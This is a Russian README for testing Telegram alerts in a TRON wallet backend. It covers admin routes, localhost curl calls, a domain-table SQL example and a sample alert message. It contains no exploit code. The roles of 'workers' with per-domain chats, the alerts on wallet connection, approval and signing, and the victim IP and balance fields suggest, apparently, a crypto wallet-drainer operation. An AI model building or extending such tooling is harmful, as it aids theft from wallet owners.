# Руководство по тестированию уведомлений

## Обзор

Добавлена полная система для тестирования Telegram уведомлений с моковыми данными через админ API.

## Файлы

### 1. Контроллер уведомлений
`src/core/api/controllers/notification.controller.ts`
- Обрабатывает все API запросы для тестирования уведомлений
- Генерирует моковые данные для каждого типа уведомления
- Валидирует конфигурации доменов

### 2. Роуты админки
`src/routes/admin.ts` - добавлены роуты:
- `GET /admin/notifications/types` - получить поддерживаемые типы
- `GET /admin/notifications/domains` - получить домены с чатами
- `GET /admin/notifications/domains/:id/validate` - валидировать чаты домена
- `POST /admin/notifications/test` - отправить тестовое уведомление
- `POST /admin/notifications/test-all` - отправить все типы уведомлений

### 3. Веб-интерфейс
`notification-test-dashboard.html` - полнофункциональный веб-интерфейс для тестирования

### 4. Документация API
`docs/NOTIFICATIONS_API.md` - полная документация по API

## Поддерживаемые типы уведомлений

1. **connection** - Подключение кошелька
2. **approved** - Одобренная транзакция
3. **signed** - Подписанная транзакция  
4. **send** - Отправленная транзакция
5. **balance_increase** - Увеличение баланса
6. **insufficient_balance** - Недостаток TRX для комиссии

## Быстрый старт

### 1. Через веб-интерфейс
```bash
# Запустите сервер
npm start

# Откройте в браузере
notification-test-dashboard.html
```

1. Введите JWT токен админа
2. Загрузите дашборд
3. Выберите тип уведомления и домен
4. Отправьте тестовое уведомление

### 2. Через API напрямую

```bash
# Получить JWT токен (сначала авторизуйтесь)
curl -X POST http://localhost:3000/admin/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "your_password"}'

# Отправить тестовое уведомление подключения
curl -X POST http://localhost:3000/admin/notifications/test \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type": "connection", "domainId": 1}'

# Отправить все типы уведомлений
curl -X POST http://localhost:3000/admin/notifications/test-all \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"domainId": 1}'
```

## Конфигурация доменов

Убедитесь, что в базе данных есть домены с настроенными чатами:

```sql
-- Пример записи в таблице Domain
INSERT INTO Domain (
  worker_id, 
  worker_nickname, 
  domain, 
  chats
) VALUES (
  'worker1',
  'TestWorker', 
  'example.com',
  '[{
    "chat_id": "-123456789",
    "token": "1234567890:ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "types": {
      "connection": true,
      "approved": true,
      "signed": true,
      "send": true,
      "balance_increase": true,
      "insufficient_balance": true
    }
  }]'
);
```

## Моковые данные

Для каждого типа уведомления генерируются реалистичные моковые данные:

- **Адреса кошельков**: Реальные TRON адреса
- **Суммы**: Случайные, но реалистичные значения
- **TX ID**: Тестовые идентификаторы с timestamp
- **Метаданные**: Информация о кошельке и воркере
- **IP и геолокация**: Тестовые данные

## Логирование

Все действия с уведомлениями логируются:

```bash
# Смотреть логи через systemd
sudo journalctl -u mytronv2 -f

# Или через веб-интерфейс в разделе "Activity Logs"
```

## Устранение неполадок

### 1. Telegram API ошибки
- Проверьте корректность bot token
- Убедитесь, что бот добавлен в чат
- Проверьте права бота на отправку сообщений

### 2. JWT ошибки
- Убедитесь, что токен не истек
- Проверьте формат: `Bearer <token>`

### 3. Ошибки парсинга чатов
- Проверьте JSON формат в поле `chats` таблицы Domain
- Используйте эндпоинт `/validate` для проверки

### 4. Ошибки авторизации
- Создайте админа через: `npm run create-admin`
- Авторизуйтесь через `/admin/auth/login`

## Примеры сообщений

### Connection notification:
```
🧊 Wallet connected #TEST_1737200000000
 ┣ PayTag: #TestWorker | test-worker-001
 ┣ Domain: example.com
 ┣ IP: 192.168.1.100 (Unknown 🏳️)
 ┣ 📖 Address: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t (Tronscan)
 ┣ 📩 Operator address: TLsV52sRDL79HXGGm9yzwKiW6SLumaGNHF (Tronscan)
 ┗ Wallet name: Test Wallet

🔑 Available balances:
native | 1000.50 TRX | 85.25$
token | 1165.50 USDT | 1165.50$

Total balance: 1250.75$

#connection
```

Теперь у вас есть полная система для тестирования уведомлений! 🎉
